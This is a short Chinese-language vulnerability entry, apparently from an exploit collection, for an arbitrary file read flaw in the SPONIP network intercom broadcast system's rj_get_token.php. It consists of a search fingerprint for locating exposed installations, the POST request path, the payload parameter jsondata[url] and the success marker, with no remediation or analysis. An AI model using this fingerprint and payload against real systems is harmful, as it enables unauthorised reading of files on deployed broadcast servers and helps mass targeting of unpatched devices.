# SPONIP网络对讲广播系统phprj_get_token.php存在任意文件读取漏洞

SPONIP ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="window.MarkerClusterer=MarkerClusterer"`
- **请求**：`POST /php/rj_get_token.php HTTP/1.1`

**Payload**
```
jsondata[url]=getjson.php
```
- **响应特征**：200